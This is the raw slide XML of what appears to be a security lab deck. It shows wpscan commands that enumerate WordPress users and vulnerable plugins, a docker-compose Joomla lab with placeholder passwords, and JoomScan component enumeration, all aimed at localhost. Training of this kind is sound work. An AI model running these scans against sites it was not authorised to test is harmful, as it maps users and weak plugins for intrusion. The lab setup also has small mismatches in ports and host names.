            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wpscan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> http://127.0.0.1:8080 --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>enumerate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>u</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="es-ES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s-E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 err="1"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" err="1" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Enumerate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Vulnerable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Plugins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E5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wpscan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> http://127.0.0.1:8080 --enumerate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>vp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="CE5DD1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4193885"/>
            <a:ext cx="8577945" cy="12604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8220"/>
            <a:ext cx="8030248" cy="182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55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075886" cy="67346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Detect hidden vulnerable plugins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E5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>wpscan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> http://127.0.0.1:8080 --enumerate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> --plugins-detection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>aggressive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1283954"/>
            <a:ext cx="10087429" cy="445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63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645" y="152399"/>
            <a:ext cx="8610600" cy="511355"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Joomla Vulnerability Scanning with JoomScan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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274" y="968554"/>
            <a:ext cx="11739584" cy="6317617"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8D2B8F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>JoomScan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="8D2B8F"/>
                </a:solidFill>
              </a:rPr>
              <a:t> scans Joomla websites for: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rgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>vulnerable components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rgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>configuration issues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rgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>version disclosure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rgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>directory listing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Bahnschrift SemiBold" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" u="sng" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="26870F"/>
                </a:solidFill>
                <a:latin typeface="Bahnschrift SemiBold" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>JoomScan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Bahnschrift SemiBold" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" u="sng" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
                <a:latin typeface="Bahnschrift SemiBold" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>:-</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> apt install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>joomscan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> apt update</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> apt install docker.io -y</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>docker-compose.yml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="22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40000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b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09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058400" cy="6121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6000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="sv-SE" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>docker-compose.yml</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="40000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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Paste this: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B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>version: '3'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rgbClr val="00B0F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B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>services: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B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomla</a:t>
            </a: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    image: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomla</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="005D7E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    ports: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      - "8080:80"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5D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>    environment: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7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      JOOMLA_DB_HOST: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>db</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      JOOMLA_DB_USER: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomla</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      JOOMLA_DB_PASSWORD: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomlapass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      JOOMLA_DB_NAME: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomla</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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B0F0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>   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depends_on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      -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db</a:t>
            </a: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 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db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    image: mariadb:10.6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 Unicode MS"/>
              </a:rPr>
              <a:t>    environment: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3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      MYSQL_ROOT_PASSWORD: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>rootpass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="3DD818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3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      MYSQL_DATABASE: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomla</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="3DD818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3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      MYSQL_USER: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomla</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="3DD818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3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>      MYSQL_PASSWORD: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="3DD818"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>joomlapass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="3DD818"/>
              </a:solidFill>
              <a:latin typeface="Arial Unicode MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="26000"/>
              </a:lnSpc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8094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231461" cy="6932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 err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>systemctl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> start </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>docker</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="CE5DD1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sudo usermod -aG docker $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>USER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0" smtClean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 Unicode MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>docker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-compose </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>up -d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</a:rPr>
              <a:t>Step 2 — Open the Joomla installation page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</a:rPr>
              <a:t>Open your browser and go to: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hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://127.0.0.1:8081</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A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00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You should see the Joomla installation wizard.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00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Complete the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>setup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00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Then for the 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" baseline="30000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t> page fill the form like this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D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Database Type: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MySQLi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7D2019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7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Host Name: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>vulnerablewordpress-db-1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7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>joomla</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7D2019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7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Password: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>joomlapass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="7D2019"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Database Name: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>joomla</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="7D2019"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Table </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prefix: sg5mi_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D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Connection Encryption: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7D2019"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Default</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 2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656457" cy="738777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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1 Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>JoomScan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (Detect Joomla)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joomscan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-u http://localhost:8080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b="1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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2 Enumerate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Joomla Components / Plugins</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="005D7E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joomscan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-u http://localhost:8080 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ec</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="CE5DD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dirty="0">
              <a:solidFill>
                <a:srgbClr val="CE5DD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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>3Enumerate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Components + Common Vulnerabilities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joomscan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-u http://localhost:8080 --enumerate-components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b="1" dirty="0" smtClean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b="1" dirty="0" smtClean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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4 Directory </a:t>
            </a:r>
            <a:r>
